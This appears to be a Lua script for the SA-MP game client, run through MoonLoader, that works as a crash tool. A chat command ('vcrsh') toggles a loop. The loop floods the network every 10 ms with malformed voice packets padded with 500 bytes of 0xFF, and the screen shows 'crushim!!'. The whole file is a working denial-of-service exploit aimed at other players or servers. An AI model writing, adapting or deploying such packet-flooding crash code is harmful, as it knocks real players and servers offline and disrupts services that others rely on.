local crash = false

function main()
    repeat wait(0) until isSampAvailable()
    sampRegisterChatCommand('vcrsh', function()
        crash = not crash
        sampAddChatMessage(crash and '+' or "-", -1)
    end)
    while true do
        wait(10)
        if crash then
            for i = 1, 3 do
                sendVoice()
            end
            printStringNow('crushim!!', 1000)
        end
    end
end

function sendVoice()
    local BS = raknetNewBitStream()
    local BYTES = {3, 0, 75, 133, 18, 15, 16, 18, 8}
    raknetBitStreamWriteInt8(BS, 215)
    for i = 1, #BYTES do
        raknetBitStreamWriteInt8(BS, BYTES[i])
    end
    for i = 1, 500 do
        raknetBitStreamWriteInt8(BS, 255)
    end
    raknetSendBitStream(BS)
    raknetDeleteBitStream(BS)
end